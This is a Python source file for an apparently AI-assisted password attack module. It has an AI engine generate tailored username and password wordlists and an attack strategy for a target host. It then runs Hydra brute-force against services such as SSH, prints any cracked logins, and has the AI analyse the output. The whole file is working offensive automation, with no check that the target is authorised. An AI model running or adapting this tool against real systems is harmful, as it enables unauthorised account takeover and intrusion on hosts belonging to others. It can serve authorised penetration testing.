#!/usr/bin/env python3
import subprocess, tempfile, os


class PasswordAttack:
    def __init__(self, engine):
        self.engine = engine

    def execute(self, target, out):
        service, host = "ssh", target
        if "://" in target:
            service, host = target.split("://", 1)
            host = host.rstrip("/")

        out(f"\r\n{'='*60}\r\n", "#00ff41")
        out(f"[ðŸ”“] AI Password Attack â€” {service}://{host}\r\n", "#00ff41")
        out(f"{'='*60}\r\n\r\n", "#00ff41")

        out("[Phase 1] Generating usernames...\r\n", "#58a6ff")
        users = self.engine.generate_wordlist(host, "usernames")
        out(f"[+] {len(users)} usernames\r\n", "#00ff41")

        out("\r\n[Phase 2] Generating passwords...\r\n", "#58a6ff")
        pwds = self.engine.generate_wordlist(host, "passwords")
        out(f"[+] {len(pwds)} passwords\r\n", "#00ff41")

        out("\r\n[Phase 3] Attack strategy...\r\n", "#58a6ff")
        s = self.engine.generate_attack_strategy(host, service)
        out(f"\r\n{s}\r\n", "#00d4ff")

        out(f"\r\n[Phase 4] Running Hydra...\r\n", "#58a6ff")
        uf = pf = None
        try:
            with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
                f.write("\n".join(users)); uf = f.name
            with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
                f.write("\n".join(pwds)); pf = f.name
            cmd = ["hydra", "-L", uf, "-P", pf, "-t", "4", "-f", "-vV", host, service]
            out(f"[*] {' '.join(cmd)}\r\n", "#888888")
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            if r.stdout:
                for line in r.stdout.split("\n"):
                    if "login:" in line.lower() and "password:" in line.lower():
                        out(f"  ðŸ”‘ {line}\r\n", "#00ff41")
                    elif line.strip():
                        out(f"  {line}\r\n", "#c9d1d9")
            if r.stderr:
                out(r.stderr + "\r\n", "#ffaa00")
            result = (r.stdout or "") + (r.stderr or "")
            out("\r\n[Phase 5] AI analysis...\r\n", "#58a6ff")
            a = self.engine.analyze_results("Hydra", result, f"{service}://{host}")
            out(f"\r\n{a}\r\n", "#00d4ff")
        except subprocess.TimeoutExpired:
            out("[!] Hydra timed out\r\n", "#ff4444")
        except FileNotFoundError:
            out("[!] Hydra not found\r\n", "#ff4444")
        finally:
            for f in (uf, pf):
                if f and os.path.exists(f): os.unlink(f)

        out(f"\r\n{'='*60}\r\n[âœ“] Password attack complete.\r\n\r\n", "#00ff41")
